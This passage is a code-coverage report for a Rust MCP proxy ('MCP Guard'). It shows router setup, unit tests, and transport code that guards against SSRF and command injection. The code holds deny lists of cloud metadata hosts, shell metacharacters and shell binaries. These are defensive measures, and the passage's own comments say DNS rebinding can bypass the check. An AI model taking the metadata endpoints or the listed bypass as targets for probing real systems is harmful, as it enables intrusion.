  971|       |        // Multi-server mode: route to /mcp/:server_name
  972|      1|        Router::new()
  973|      1|            .route("/mcp/:server_name", post(handle_routed_mcp_message))
  974|      1|            .layer(middleware::from_fn_with_state(state.clone(), auth_middleware))
  975|       |    } else {
  976|       |        // Single-server mode: route to /mcp
  977|     10|        Router::new()
  978|     10|            .route("/mcp", post(handle_mcp_message))
  979|     10|            .layer(middleware::from_fn_with_state(state.clone(), auth_middleware))
  980|       |    };
  981|       |
  982|       |    // OAuth routes (only added if OAuth is configured)
  983|     11|    let mut router = Router::new()
  984|     11|        .route("/health", get(health))
  985|     11|        .route("/live", get(live))
  986|     11|        .route("/ready", get(ready))
  987|     11|        .route("/metrics", get(metrics_handler));
  988|       |
  989|       |    // Add routes endpoint for multi-server mode (lists available servers)
  990|     11|    if is_multi_server {
  991|      1|        router = router.route("/routes", get(list_routes));
  992|     10|    }
  993|       |
  994|     11|    if state.oauth_provider.is_some() {
  995|      4|        router = router
  996|      4|            .route("/oauth/authorize", get(oauth_authorize))
  997|      4|            .route("/oauth/callback", get(oauth_callback));
  998|      7|    }
  999|       |
 1000|       |    // Build the router with middleware layers
 1001|       |    // Layer order (bottom to top): SecurityHeaders -> TraceContext -> Metrics -> TraceLayer
 1002|       |    // Security headers are applied first (outermost) to ensure all responses get them
 1003|     11|    router
 1004|     11|        .merge(protected_routes)
 1005|     11|        .layer(middleware::from_fn(metrics_middleware))
 1006|     11|        .layer(middleware::from_fn(trace_context_middleware))
 1007|     11|        .layer(middleware::from_fn(security_headers_middleware))
 1008|     11|        .layer(TraceLayer::new_for_http())
 1009|     11|        .with_state(state)
 1010|     11|}
 1011|       |
 1012|       |/// List available server routes (multi-server mode only)
 1013|      1|async fn list_routes(State(state): State<Arc<AppState>>) -> impl IntoResponse {
 1014|      1|    if let Some(ref router) = state.router {
 1015|      2|        let routes: Vec<_> = router.route_names().iter().map(|s| s.to_string()).collect();
                          ^1      ^1       ^1                          ^1                     ^1
 1016|      1|        let body = serde_json::json!({
 1017|      1|            "routes": routes,
 1018|      1|            "count": routes.len()
 1019|       |        });
 1020|      1|        (StatusCode::OK, Json(body))
 1021|       |    } else {
 1022|      0|        let body = serde_json::json!({
 1023|      0|            "routes": [],
 1024|      0|            "count": 0,
 1025|      0|            "note": "Single-server mode, no routes configured"
 1026|       |        });
 1027|      0|        (StatusCode::OK, Json(body))
 1028|       |    }
 1029|      1|}
 1030|       |
 1031|       |/// Run the server
 1032|      0|pub async fn run(state: Arc<AppState>) -> Result<(), crate::Error> {
 1033|      0|    let addr = format!("{}:{}", state.config.server.host, state.config.server.port);
 1034|      0|    let listener = tokio::net::TcpListener::bind(&addr).await?;
 1035|       |
 1036|      0|    tracing::info!("MCP Guard listening on {}", addr);
 1037|       |
 1038|      0|    let app = build_router(state);
 1039|      0|    axum::serve(
 1040|      0|        listener,
 1041|      0|        app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
 1042|      0|    )
 1043|      0|    .await
 1044|      0|    .map_err(|e| crate::Error::Server(e.to_string()))
 1045|      0|}
 1046|       |
 1047|       |// ============================================================================
 1048|       |// Tests
 1049|       |// ============================================================================
 1050|       |
 1051|       |#[cfg(test)]
 1052|       |mod tests {
 1053|       |    use super::*;
 1054|       |    use axum::http::{Request, StatusCode};
 1055|       |    use opentelemetry::propagation::Extractor;
 1056|       |    use tower::ServiceExt;
 1057|       |
 1058|       |    // ------------------------------------------------------------------------
 1059|       |    // AppError Tests
 1060|       |    // ------------------------------------------------------------------------
 1061|       |
 1062|       |    #[test]
 1063|      1|    fn test_app_error_unauthorized() {
 1064|      1|        let err = AppError::unauthorized("Invalid token");
 1065|      1|        assert!(matches!(err.kind, AppErrorKind::Unauthorized(_)));
                              ^0
 1066|      1|        assert!(!err.error_id.is_empty());
 1067|      1|    }
 1068|       |
 1069|       |    #[test]
 1070|      1|    fn test_app_error_forbidden() {
 1071|      1|        let err = AppError::forbidden("Access denied");
 1072|      1|        assert!(matches!(err.kind, AppErrorKind::Forbidden(_)));
                              ^0
 1073|      1|    }
 1074|       |
 1075|       |    #[test]
 1076|      1|    fn test_app_error_not_found() {
 1077|      1|        let err = AppError::not_found("Route not found");
 1078|      1|        assert!(matches!(err.kind, AppErrorKind::NotFound(_)));
                              ^0
 1079|      1|    }
 1080|       |
 1081|       |    #[test]
 1082|      1|    fn test_app_error_rate_limited() {
 1083|      1|        let err = AppError::rate_limited(Some(5));
 1084|      1|        match err.kind {
 1085|      1|            AppErrorKind::RateLimited { retry_after_secs, .. } => {
 1086|      1|                assert_eq!(retry_after_secs, Some(5));
 1087|       |            }
 1088|      0|            _ => panic!("Expected RateLimited"),
 1089|       |        }
 1090|      1|    }
 1091|       |
 1092|       |    #[test]
 1093|      1|    fn test_app_error_internal() {
 1094|      1|        let err = AppError::internal("Something went wrong");
 1095|      1|        assert!(matches!(err.kind, AppErrorKind::Internal(_)));
                              ^0
 1096|      1|    }
 1097|       |
 1098|       |    #[tokio::test]
 1099|      1|    async fn test_app_error_unauthorized_response() {
 1100|      1|        let err = AppError::unauthorized("Test unauthorized");
 1101|      1|        let response = err.into_response();
 1102|      1|        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
 1103|      1|    }
 1104|       |
 1105|       |    #[tokio::test]
 1106|      1|    async fn test_app_error_forbidden_response() {
 1107|      1|        let err = AppError::forbidden("Test forbidden");
 1108|      1|        let response = err.into_response();
 1109|      1|        assert_eq!(response.status(), StatusCode::FORBIDDEN);
 1110|      1|    }
 1111|       |
 1112|       |    #[tokio::test]
 1113|      1|    async fn test_app_error_not_found_response() {
 1114|      1|        let err = AppError::not_found("Test not found");
 1115|      1|        let response = err.into_response();
 1116|      1|        assert_eq!(response.status(), StatusCode::NOT_FOUND);
 1117|      1|    }
 1118|       |
 1119|       |    #[tokio::test]
 1120|      1|    async fn test_app_error_rate_limited_response() {
 1121|      1|        let err = AppError::rate_limited(Some(10));
 1122|      1|        let response = err.into_response();
 1123|      1|        assert_eq!(response.status(), StatusCode::TOO_MANY_REQUESTS);
 1124|      1|        assert!(response.headers().get(header::RETRY_AFTER).is_some());
 1125|      1|    }
 1126|       |
 1127|       |    #[tokio::test]
 1128|      1|    async fn test_app_error_internal_response() {
 1129|      1|        let err = AppError::internal("Internal error");
 1130|      1|        let response = err.into_response();
 1131|      1|        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
 1132|      1|    }
 1133|       |
 1134|       |    #[tokio::test]
 1135|      1|    async fn test_app_error_transport_timeout_response() {
 1136|      1|        let err = AppError::transport(crate::transport::TransportError::Timeout);
 1137|      1|        let response = err.into_response();
 1138|      1|        assert_eq!(response.status(), StatusCode::BAD_GATEWAY);
 1139|      1|    }
 1140|       |
 1141|       |    #[tokio::test]
 1142|      1|    async fn test_app_error_transport_connection_closed_response() {
 1143|      1|        let err = AppError::transport(crate::transport::TransportError::ConnectionClosed);
 1144|      1|        let response = err.into_response();
 1145|      1|        assert_eq!(response.status(), StatusCode::BAD_GATEWAY);
 1146|      1|    }
 1147|       |
 1148|       |    // ------------------------------------------------------------------------
 1149|       |    // PKCE & OAuth State Tests
 1150|       |    // ------------------------------------------------------------------------
 1151|       |
 1152|       |    #[test]
 1153|      1|    fn test_generate_random_string() {
 1154|      1|        let s1 = generate_random_string(32);
 1155|      1|        let s2 = generate_random_string(32);
 1156|      1|        assert_eq!(s1.len(), 32);
 1157|      1|        assert_eq!(s2.len(), 32);
 1158|      1|        assert_ne!(s1, s2); // Should be different each time
 1159|      1|    }
 1160|       |
 1161|       |    #[test]
 1162|      1|    fn test_generate_pkce() {
 1163|      1|        let (verifier, challenge) = generate_pkce();
 1164|      1|        assert_eq!(verifier.len(), 64);
 1165|      1|        assert!(!challenge.is_empty());
 1166|       |        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
 1167|      1|        assert_eq!(challenge.len(), 43);
 1168|      1|    }
 1169|       |
 1170|       |    #[test]
 1171|      1|    fn test_pkce_consistency() {
 1172|       |        // Verify that verifier and challenge are correctly related
 1173|       |        use sha2::{Digest, Sha256};
 1174|       |        
 1175|      1|        let (verifier, challenge) = generate_pkce();
 1176|       |        
 1177|       |        // Manually compute expected challenge
 1178|      1|        let mut hasher = Sha256::new();
 1179|      1|        hasher.update(verifier.as_bytes());
 1180|      1|        let hash = hasher.finalize();
 1181|      1|        let expected_challenge = base64::Engine::encode(
 1182|      1|            &base64::engine::general_purpose::URL_SAFE_NO_PAD,
 1183|      1|            hash,
 1184|       |        );
 1185|       |        
 1186|      1|        assert_eq!(challenge, expected_challenge);
 1187|      1|    }
 1188|       |
 1189|       |    #[test]
 1190|      1|    fn test_new_oauth_state_store() {
 1191|      1|        let store = new_oauth_state_store();
 1192|      1|        assert!(store.is_empty());
 1193|      1|    }
 1194|       |
 1195|       |    #[test]
 1196|      1|    fn test_cleanup_expired_oauth_states() {
 1197|      1|        let store = new_oauth_state_store();
 1198|       |
 1199|       |        // Add a fresh state with client IP binding
 1200|      1|        store.insert("fresh".to_string(), PkceState {
 1201|      1|            code_verifier: "verifier".to_string(),
 1202|      1|            created_at: Instant::now(),
 1203|      1|            client_ip: "127.0.0.1".parse().unwrap(),
 1204|      1|        });
 1205|       |
 1206|       |        // Cleanup should keep fresh state
 1207|      1|        cleanup_expired_oauth_states(&store);
 1208|      1|        assert!(store.contains_key("fresh"));
 1209|      1|    }
 1210|       |
 1211|       |    #[test]
 1212|      1|    fn test_generate_random_string_entropy() {
 1213|       |        // Test that generated strings are unique (high entropy)
 1214|      1|        let s1 = generate_random_string(32);
 1215|      1|        let s2 = generate_random_string(32);
 1216|      1|        let s3 = generate_random_string(32);
 1217|       |
 1218|      1|        assert_eq!(s1.len(), 32);
 1219|      1|        assert_eq!(s2.len(), 32);
 1220|      1|        assert_eq!(s3.len(), 32);
 1221|       |
 1222|       |        // All should be different (with overwhelming probability)
 1223|      1|        assert_ne!(s1, s2);
 1224|      1|        assert_ne!(s2, s3);
 1225|      1|        assert_ne!(s1, s3);
 1226|       |
 1227|       |        // Should only contain URL-safe base64 characters
 1228|     32|        for c in s1.chars() {
                               ^1 ^1
 1229|     32|            assert!(c.is_ascii_alphanumeric() || c == '-' || c == '_');
                                                               ^2          ^2
 1230|       |        }
 1231|      1|    }
 1232|       |
 1233|       |    #[test]
 1234|      1|    fn test_oauth_state_store_limit_constant() {
 1235|       |        // Verify the constant is set to a reasonable value
 1236|      1|        assert!(MAX_PENDING_OAUTH_STATES >= 1000); // At least 1000 for legitimate use
 1237|      1|        assert!(MAX_PENDING_OAUTH_STATES <= 100_000); // Not too high to be useless
 1238|      1|    }
 1239|       |
 1240|       |    #[test]
 1241|      1|    fn test_oauth_state_store_capacity_check() {
 1242|       |        // This test verifies the store can be checked for capacity
 1243|      1|        let store = new_oauth_state_store();
 1244|       |
 1245|       |        // Fill to near capacity (we don't actually fill to max to avoid test slowness)
 1246|    101|        for i in 0..100 {
                          ^100
 1247|    100|            store.insert(format!("state_{}", i), PkceState {
 1248|    100|                code_verifier: "verifier".to_string(),
 1249|    100|                created_at: Instant::now(),
 1250|    100|                client_ip: "127.0.0.1".parse().unwrap(),
 1251|    100|            });
 1252|    100|        }
 1253|       |
 1254|       |        // Verify we can check the length
 1255|      1|        assert_eq!(store.len(), 100);
 1256|       |
 1257|       |        // Verify the max constant is accessible
 1258|      1|        assert!(store.len() < MAX_PENDING_OAUTH_STATES);
 1259|      1|    }
 1260|       |
 1261|       |    // ------------------------------------------------------------------------
 1262|       |    // Response Types Tests
 1263|       |    // ------------------------------------------------------------------------
 1264|       |
 1265|       |    #[test]
 1266|      1|    fn test_health_response_serialization() {
 1267|      1|        let response = HealthResponse {
 1268|      1|            status: "healthy",
 1269|      1|            version: "1.0.0",
 1270|      1|            uptime_secs: 100,
 1271|      1|        };
 1272|      1|        let json = serde_json::to_string(&response).unwrap();
 1273|      1|        assert!(json.contains("healthy"));
 1274|      1|        assert!(json.contains("1.0.0"));
 1275|      1|        assert!(json.contains("100"));
 1276|      1|    }
 1277|       |
 1278|       |    #[test]
 1279|      1|    fn test_live_response_serialization() {
 1280|      1|        let response = LiveResponse { status: "alive" };
 1281|      1|        let json = serde_json::to_string(&response).unwrap();
 1282|      1|        assert!(json.contains("alive"));
 1283|      1|    }
 1284|       |
 1285|       |    #[test]
 1286|      1|    fn test_ready_response_ready() {
 1287|      1|        let response = ReadyResponse {
 1288|      1|            ready: true,
 1289|      1|            version: "1.0.0",
 1290|      1|            reason: None,
 1291|      1|        };
 1292|      1|        let json = serde_json::to_string(&response).unwrap();
 1293|      1|        assert!(json.contains("true"));
 1294|      1|        assert!(!json.contains("reason")); // Should be skipped when None
 1295|      1|    }
 1296|       |
 1297|       |    #[test]
 1298|      1|    fn test_ready_response_not_ready() {
 1299|      1|        let response = ReadyResponse {
 1300|      1|            ready: false,
 1301|      1|            version: "1.0.0",
 1302|      1|            reason: Some("Transport not initialized".to_string()),
 1303|      1|        };
 1304|      1|        let json = serde_json::to_string(&response).unwrap();
 1305|      1|        assert!(json.contains("false"));
 1306|      1|        assert!(json.contains("Transport not initialized"));
 1307|      1|    }
 1308|       |
 1309|       |    // ------------------------------------------------------------------------
 1310|       |    // Security Headers Middleware Test
 1311|       |    // ------------------------------------------------------------------------
 1312|       |
 1313|       |    #[tokio::test]
 1314|      1|    async fn test_security_headers_middleware() {
 1315|       |        use axum::routing::get;
 1316|       |
 1317|      1|        async fn dummy_handler() -> &'static str {
 1318|      1|            "OK"
 1319|      1|        }
 1320|       |
 1321|      1|        let app = Router::new()
 1322|      1|            .route("/test", get(dummy_handler))
 1323|      1|            .layer(middleware::from_fn(security_headers_middleware));
 1324|       |
 1325|      1|        let response = app
 1326|      1|            .oneshot(Request::builder().uri("/test").body(Body::empty()).unwrap())
 1327|      1|            .await
 1328|      1|            .unwrap();
 1329|       |
 1330|      1|        assert_eq!(response.status(), StatusCode::OK);
 1331|       |        
 1332|       |        // Check security headers are present
 1333|      1|        assert_eq!(
 1334|      1|            response.headers().get(header::X_CONTENT_TYPE_OPTIONS).unwrap(),
 1335|       |            "nosniff"
 1336|       |        );
 1337|      1|        assert_eq!(
 1338|      1|            response.headers().get(header::X_FRAME_OPTIONS).unwrap(),
 1339|       |            "DENY"
 1340|       |        );
 1341|      1|        assert_eq!(
 1342|      1|            response.headers().get("x-xss-protection").unwrap(),
 1343|       |            "1; mode=block"
 1344|       |        );
 1345|      1|        assert_eq!(
 1346|      1|            response.headers().get(header::CONTENT_SECURITY_POLICY).unwrap(),
 1347|      1|            "default-src 'none'"
 1348|      1|        );
 1349|      1|    }
 1350|       |
 1351|       |    // ------------------------------------------------------------------------
 1352|       |    // Header Extractor/Injector Tests
 1353|       |    // ------------------------------------------------------------------------
 1354|       |
 1355|       |    #[test]
 1356|      1|    fn test_header_extractor() {
 1357|      1|        let mut headers = HeaderMap::new();
 1358|      1|        headers.insert("traceparent", HeaderValue::from_static("00-abc-def-01"));
 1359|       |        
 1360|      1|        let extractor = HeaderExtractor(&headers);
 1361|      1|        assert_eq!(extractor.get("traceparent"), Some("00-abc-def-01"));
 1362|      1|        assert_eq!(extractor.get("missing"), None);
 1363|      1|    }
 1364|       |
 1365|       |    #[test]
 1366|      1|    fn test_header_extractor_keys() {
 1367|      1|        let mut headers = HeaderMap::new();
 1368|      1|        headers.insert("x-custom", HeaderValue::from_static("value"));
 1369|      1|        headers.insert("content-type", HeaderValue::from_static("application/json"));
 1370|       |        
 1371|      1|        let extractor = HeaderExtractor(&headers);
 1372|      1|        let keys = extractor.keys();
 1373|      1|        assert!(keys.contains(&"x-custom"));
 1374|      1|        assert!(keys.contains(&"content-type"));
 1375|      1|    }
 1376|       |
 1377|       |    #[test]
 1378|      1|    fn test_header_injector() {
 1379|       |        use opentelemetry::propagation::Injector;
 1380|       |        
 1381|      1|        let mut headers = HeaderMap::new();
 1382|      1|        {
 1383|      1|            let mut injector = HeaderInjector(&mut headers);
 1384|      1|            injector.set("x-trace-id", "12345".to_string());
 1385|      1|        }
 1386|       |        
 1387|      1|        assert_eq!(headers.get("x-trace-id").unwrap(), "12345");
 1388|      1|    }
 1389|       |
 1390|       |    #[test]
 1391|      1|    fn test_app_error_response_codes() {
 1392|       |        // Forbidden
 1393|      1|        let err = AppError::forbidden("access denied");
 1394|      1|        let resp = err.into_response();
 1395|      1|        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
 1396|       |        
 1397|       |        // Not Found
 1398|      1|        let err = AppError::not_found("resource missing");
 1399|      1|        let resp = err.into_response();
 1400|      1|        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
 1401|       |        
 1402|       |        // Transport error
 1403|      1|        let err = AppError::transport(crate::transport::TransportError::Timeout);
 1404|      1|        let resp = err.into_response();
 1405|      1|        assert_eq!(resp.status(), StatusCode::BAD_GATEWAY);
 1406|       |        
 1407|       |        // Internal
 1408|      1|        let err = AppError::internal("boom");
 1409|      1|        let resp = err.into_response();
 1410|      1|        assert_eq!(resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
 1411|      1|    }
 1412|       |
 1413|       |    #[tokio::test]
 1414|      1|    async fn test_trace_context_middleware() {
 1415|       |        use tower::ServiceExt;
 1416|       |        
 1417|      1|        async fn handler() -> &'static str { "ok" }
 1418|       |        
 1419|      1|        let app = Router::new()
 1420|      1|             .route("/", get(handler))
 1421|      1|             .layer(middleware::from_fn(trace_context_middleware));
 1422|       |             
 1423|      1|        let req = Request::builder()
 1424|      1|            .uri("/")
 1425|      1|            .header("traceparent", "00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01")
 1426|      1|            .body(Body::empty())
 1427|      1|            .unwrap();
 1428|       |            
 1429|      1|        let resp = app.oneshot(req).await.unwrap();
 1430|      1|        assert_eq!(resp.status(), StatusCode::OK);
 1431|      1|    }
 1432|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/transport/mod.rs:
    1|       |//! MCP transport implementations
    2|       |
    3|       |use async_trait::async_trait;
    4|       |use std::collections::HashMap;
    5|       |use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
    6|       |use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
    7|       |use tokio::process::{Child, Command};
    8|       |use tokio::sync::mpsc;
    9|       |
   10|       |// ============================================================================
   11|       |// Constants
   12|       |// ============================================================================
   13|       |
   14|       |/// Channel buffer size for transport messages.
   15|       |/// 32 messages provides headroom for burst traffic while keeping memory bounded.
   16|       |/// Stdio transports typically process messages sequentially, so large buffers aren't needed.
   17|       |const TRANSPORT_CHANNEL_SIZE: usize = 32;
   18|       |
   19|       |/// Default HTTP request timeout.
   20|       |/// 30 seconds balances allowing time for slow MCP operations (like file searches)
   21|       |/// while preventing indefinite hangs on unresponsive servers.
   22|       |const HTTP_REQUEST_TIMEOUT_SECS: u64 = 30;
   23|       |
   24|       |/// Transport error type
   25|       |#[derive(Debug, thiserror::Error)]
   26|       |pub enum TransportError {
   27|       |    #[error("Failed to spawn process: {0}")]
   28|       |    Spawn(#[from] std::io::Error),
   29|       |
   30|       |    #[error("Process exited unexpectedly")]
   31|       |    ProcessExited,
   32|       |
   33|       |    #[error("Failed to send message: {0}")]
   34|       |    Send(String),
   35|       |
   36|       |    #[error("Failed to receive message: {0}")]
   37|       |    Receive(String),
   38|       |
   39|       |    #[error("Invalid message format: {0}")]
   40|       |    InvalidMessage(String),
   41|       |
   42|       |    #[error("Connection closed")]
   43|       |    ConnectionClosed,
   44|       |
   45|       |    #[error("HTTP error: {0}")]
   46|       |    Http(String),
   47|       |
   48|       |    #[error("SSE error: {0}")]
   49|       |    Sse(String),
   50|       |
   51|       |    #[error("Timeout")]
   52|       |    Timeout,
   53|       |
   54|       |    #[error("SSRF blocked: {0}")]
   55|       |    SsrfBlocked(String),
   56|       |
   57|       |    #[error("Invalid URL: {0}")]
   58|       |    InvalidUrl(String),
   59|       |
   60|       |    #[error("Command validation failed: {0}")]
   61|       |    CommandValidation(String),
   62|       |}
   63|       |
   64|       |// ============================================================================
   65|       |// URL Validation (SSRF Prevention)
   66|       |// ============================================================================
   67|       |
   68|       |/// Check if an IPv4 address is in a private/internal range
   69|     21|fn is_private_ipv4(ip: &Ipv4Addr) -> bool {
   70|       |    // Private ranges (RFC 1918)
   71|     21|    ip.is_private()
   72|       |        // Loopback (127.0.0.0/8)
   73|     11|        || ip.is_loopback()
   74|       |        // Link-local (169.254.0.0/16) - includes cloud metadata endpoints
   75|      6|        || ip.is_link_local()
   76|       |        // Broadcast
   77|      6|        || ip.is_broadcast()
   78|       |        // Documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24)
   79|      6|        || ip.is_documentation()
   80|       |        // Unspecified (0.0.0.0)
   81|      6|        || ip.is_unspecified()
   82|       |        // Shared address space (100.64.0.0/10) - RFC 6598
   83|      6|        || (ip.octets()[0] == 100 && (ip.octets()[1] & 0xC0) == 64)
                                                   ^0^0
   84|       |        // Reserved for future use (240.0.0.0/4)
   85|      6|        || ip.octets()[0] >= 240
   86|     21|}
   87|       |
   88|       |/// Check if an IPv6 address is in a private/internal range
   89|      6|fn is_private_ipv6(ip: &Ipv6Addr) -> bool {
   90|       |    // Loopback (::1)
   91|      6|    ip.is_loopback()
   92|       |        // Unspecified (::)
   93|      6|        || ip.is_unspecified()
   94|       |        // IPv4-mapped addresses - check the embedded IPv4
   95|      6|        || ip.to_ipv4_mapped().map(|v4| is_private_ipv4(&v4)).unwrap_or(false)
                                                      ^0              ^0
   96|       |        // Unique local addresses (fc00::/7)
   97|      6|        || (ip.segments()[0] & 0xfe00) == 0xfc00
   98|       |        // Link-local (fe80::/10)
   99|      6|        || (ip.segments()[0] & 0xffc0) == 0xfe80
  100|      6|}
  101|       |
  102|       |/// Check if an IP address is private/internal
  103|     27|fn is_private_ip(ip: &IpAddr) -> bool {
  104|     27|    match ip {
  105|     21|        IpAddr::V4(v4) => is_private_ipv4(v4),
  106|      6|        IpAddr::V6(v6) => is_private_ipv6(v6),
  107|       |    }
  108|     27|}
  109|       |
  110|       |/// Validate a URL for SSRF safety
  111|       |///
  112|       |/// This function checks that a URL:
  113|       |/// - Has a valid HTTP or HTTPS scheme
  114|       |/// - Does not target private/internal IP ranges
  115|       |/// - Does not target cloud metadata endpoints
  116|       |///
  117|       |/// Returns `Ok(())` if the URL is safe, or an error describing why it's blocked.
  118|     31|pub fn validate_url_for_ssrf(url: &str) -> Result<(), TransportError> {
  119|       |    // Parse the URL
  120|     31|    let parsed = url::Url::parse(url)
                      ^29
  121|     31|        .map_err(|e| TransportError::InvalidUrl(format!("Failed to parse URL: {}", e)))?;
                                                              ^2      ^2                             ^2
  122|       |
  123|       |    // Validate scheme
  124|     29|    match parsed.scheme() {
  125|     29|        "http" | "https" => {}
                               ^7         ^24
  126|      5|        scheme => {
  127|      5|            return Err(TransportError::SsrfBlocked(format!(
  128|      5|                "Invalid URL scheme '{}', only http and https are allowed",
  129|      5|                scheme
  130|      5|            )));
  131|       |        }
  132|       |    }
  133|       |
  134|       |    // Get the host
  135|     24|    let host = parsed.host_str().ok_or_else(|| {
                                                             ^0
  136|      0|        TransportError::InvalidUrl("URL has no host".to_string())
  137|      0|    })?;
  138|       |
  139|       |    // Block common cloud metadata hostnames
  140|     24|    let blocked_hosts = [
  141|     24|        "metadata.google.internal",
  142|     24|        "metadata.goog",
  143|     24|        "169.254.169.254",
  144|     24|        "fd00:ec2::254",
  145|     24|        "metadata.azure.internal",
  146|     24|        "100.100.100.200", // Alibaba Cloud
  147|     24|    ];
  148|       |
  149|     24|    let host_lower = host.to_lowercase();
  150|    140|    for blocked in &blocked_hosts {
                      ^122
  151|    122|        if host_lower == *blocked {
  152|      6|            return Err(TransportError::SsrfBlocked(format!(
  153|      6|                "Access to cloud metadata endpoint '{}' is blocked",
  154|      6|                host
  155|      6|            )));
  156|    116|        }
  157|       |    }
  158|       |
  159|       |    // If the host is an IP address, check if it's private
  160|     18|    if let Ok(ip) = host.parse::<IpAddr>() {
                            ^14
  161|     14|        if is_private_ip(&ip) {
  162|     14|            return Err(TransportError::SsrfBlocked(format!(
  163|     14|                "Access to private/internal IP address '{}' is blocked",
  164|     14|                ip
  165|     14|            )));
  166|      0|        }
  167|      4|    }
  168|       |
  169|       |    // For hostnames, we perform DNS resolution to check the resolved IP
  170|       |    // Note: This is done synchronously here for simplicity. In production,
  171|       |    // you might want to use async DNS resolution.
  172|       |    // However, DNS resolution at construction time provides defense-in-depth.
  173|      4|    if host.parse::<IpAddr>().is_err() {
  174|       |        // It's a hostname, try to resolve it
  175|       |        use std::net::ToSocketAddrs;
  176|       |
  177|       |        // Add a port for resolution (use the URL's port or default)
  178|      4|        let port = parsed.port().unwrap_or(match parsed.scheme() {
  179|      4|            "https" => 443,
                                     ^2
  180|      2|            _ => 80,
  181|       |        });
  182|       |
  183|      4|        let socket_addr = format!("{}:{}", host, port);
  184|      4|        if let Ok(addrs) = socket_addr.to_socket_addrs() {
                                ^2
  185|     14|            for addr in addrs {
                              ^13
  186|     13|                if is_private_ip(&addr.ip()) {
  187|      1|                    return Err(TransportError::SsrfBlocked(format!(
  188|      1|                        "Hostname '{}' resolves to private/internal IP address '{}'",
  189|      1|                        host,
  190|      1|                        addr.ip()
  191|      1|                    )));
  192|     12|                }
  193|       |            }
  194|      2|        }
  195|       |        // If DNS resolution fails, we allow it to fail later during the actual request
  196|       |        // This prevents DNS-based DoS but may allow some SSRF via DNS rebinding
  197|       |        // For production, consider using a DNS resolver with SSRF protection
  198|      0|    }
  199|       |
  200|      3|    Ok(())
  201|     31|}
  202|       |
  203|       |// ============================================================================
  204|       |// Command Validation (Injection Prevention)
  205|       |// ============================================================================
  206|       |
  207|       |/// Shell metacharacters that could be used for command injection
  208|       |const SHELL_METACHARACTERS: &[char] = &[
  209|       |    ';',  // Command separator
  210|       |    '|',  // Pipe
  211|       |    '&',  // Background/AND
  212|       |    '$',  // Variable expansion
  213|       |    '`',  // Command substitution
  214|       |    '(',  // Subshell
  215|       |    ')',  // Subshell
  216|       |    '{',  // Brace expansion
  217|       |    '}',  // Brace expansion
  218|       |    '<',  // Redirection
  219|       |    '>',  // Redirection
  220|       |    '\n', // Newline (command separator)
  221|       |    '\r', // Carriage return
  222|       |];
  223|       |
  224|       |/// Characters that are suspicious in commands but not always dangerous
  225|       |const SUSPICIOUS_CHARACTERS: &[char] = &[
  226|       |    '!',  // History expansion
  227|       |    '~',  // Home expansion (usually safe but can be abused)
  228|       |    '*',  // Glob
  229|       |    '?',  // Glob
  230|       |    '[',  // Glob pattern
  231|       |    ']',  // Glob pattern
  232|       |];
  233|       |
  234|       |/// Validate a command for injection safety
  235|       |///
  236|       |/// This function checks that a command:
  237|       |/// - Does not contain shell metacharacters that could enable injection
  238|       |/// - Does not start with suspicious prefixes
  239|       |///
  240|       |/// Returns `Ok(())` if the command is safe, or an error describing why it's blocked.
  241|     48|pub fn validate_command_for_injection(command: &str) -> Result<(), TransportError> {
  242|       |    // Empty command is invalid
  243|     48|    if command.is_empty() {
  244|      1|        return Err(TransportError::CommandValidation(
  245|      1|            "Command cannot be empty".to_string(),
  246|      1|        ));
  247|     47|    }
  248|       |
  249|       |    // Check for shell metacharacters
  250|    512|    for &c in SHELL_METACHARACTERS {
                       ^481
  251|    481|        if command.contains(c) {
  252|     16|            let char_display = match c {
  253|      1|                '\n' => "\\n".to_string(),
  254|      0|                '\r' => "\\r".to_string(),
  255|     15|                _ => c.to_string(),
  256|       |            };
  257|     16|            return Err(TransportError::CommandValidation(format!(
  258|     16|                "Command contains forbidden shell metacharacter '{}'",
  259|     16|                char_display
  260|     16|            )));
  261|    465|        }
  262|       |    }
  263|       |
  264|       |    // Warn about suspicious characters (but don't block for now - some legitimate uses)
  265|    217|    for &c in SUSPICIOUS_CHARACTERS {
                       ^186
  266|    186|        if command.contains(c) {
  267|      0|            tracing::warn!(
  268|       |                command = %command,
  269|       |                character = %c,
  270|      0|                "Command contains suspicious character - consider using absolute paths"
  271|       |            );
  272|    186|        }
  273|       |    }
  274|       |
  275|       |    // Block commands that try to invoke a shell directly
  276|     31|    let shell_commands = ["sh", "bash", "zsh", "fish", "csh", "ksh", "dash", "cmd", "powershell", "pwsh"];
  277|       |
  278|       |    // Get the command basename
  279|     31|    let basename = std::path::Path::new(command)
  280|     31|        .file_name()
  281|     31|        .and_then(|s| s.to_str())
  282|     31|        .unwrap_or(command);
  283|       |
  284|    261|    for shell in shell_commands {
                      ^241
  285|    241|        if basename == shell || basename == format!("{}.exe", shell) {
                                              ^231
  286|     11|            return Err(TransportError::CommandValidation(format!(
  287|     11|                "Direct shell execution '{}' is not allowed - specify the actual MCP server command",
  288|     11|                command
  289|     11|            )));
  290|    230|        }
  291|       |    }
  292|       |
  293|     20|    Ok(())
  294|     48|}
  295|       |
  296|       |/// Validate command arguments for injection safety
  297|       |///
  298|       |/// Checks that arguments don't contain shell metacharacters.
  299|     18|pub fn validate_args_for_injection(args: &[String]) -> Result<(), TransportError> {
  300|     18|    for (i, arg) in args.iter().enumerate() {
                       ^14^14
  301|    160|        for &c in SHELL_METACHARACTERS {
                           ^149
  302|    149|            if arg.contains(c) {
  303|      3|                let char_display = match c {
  304|      0|                    '\n' => "\\n".to_string(),
  305|      0|                    '\r' => "\\r".to_string(),
  306|      3|                    _ => c.to_string(),
  307|       |                };
  308|      3|                return Err(TransportError::CommandValidation(format!(
  309|      3|                    "Argument {} contains forbidden shell metacharacter '{}'",
  310|      3|                    i,
  311|      3|                    char_display
  312|      3|                )));
  313|    146|            }
  314|       |        }
  315|       |    }
  316|     15|    Ok(())
  317|     18|}
  318|       |
  319|       |/// MCP JSON-RPC message
  320|       |///
